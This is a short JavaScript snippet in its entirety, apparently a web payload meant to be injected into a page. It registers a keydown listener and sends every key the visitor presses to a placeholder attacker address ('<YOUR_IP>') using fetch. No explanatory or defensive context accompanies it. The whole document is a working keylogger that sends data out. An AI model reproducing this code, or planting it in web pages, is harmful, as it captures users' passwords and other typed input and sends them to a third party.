function logKey(event){
        fetch("http://<YOUR_IP>/k?key=" + encodeURIComponent(event.key))
}

document.addEventListener('keydown', logKey);
